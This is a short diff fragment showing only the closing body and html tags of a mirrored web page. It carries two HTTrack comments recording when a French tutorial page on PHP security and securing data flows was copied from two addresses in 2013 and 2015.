+</body>
+<!-- Mirrored from 62.4.17.167/sdz/sdz/securite-php-securiser-les-flux-de-donnees.html by HTTrack Website Copier/3.x [XR&CO'2013], Sat, 26 Oct 2013 23:27:27 GMT -->
+
+<!-- Mirrored from sdz.tdct.org/sdz/securite-php-securiser-les-flux-de-donnees.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Nov 2015 04:07:51 GMT -->
+</html>
